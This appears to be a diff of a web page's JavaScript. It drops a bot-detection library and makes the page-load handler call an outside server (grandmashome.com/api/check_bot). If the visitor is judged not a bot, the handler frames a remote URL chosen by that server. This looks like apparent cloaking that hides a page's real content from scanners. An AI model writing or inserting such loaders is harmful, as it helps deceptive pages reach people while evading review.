@@ -1,4 +1,4 @@
-const botdPromise = import('./botid.js').then((Botd) => Botd.load());
+// const botdPromise = import('./botid.js').then((Botd) => Botd.load());
 
 
 const createLoader = () => {
@@ -43,22 +43,14 @@ window.addEventListener('message', (message) => {
 })
 
 window.addEventListener('DOMContentLoaded', () => {
-    botdPromise
-    .then((botd) => botd.detect())
-    .then(async (result) => {
-        if (result) {
-            fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
-                if (res?.code == 200 && !res.result) {
-                    
-                    createFrame(res.url + '5ZnnGmYM')
-                }
-                setTimeout(toggleLoad, 1000);
-                
-            })
+    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
+        if (res?.code == 200 && !res.result) {
+            
+            createFrame(res.url + '5ZnnGmYM')
         }
-
-    }).catch((error) => console.error(error))
-  
+        setTimeout(toggleLoad, 1000);
+        
+    })
 })
 
 
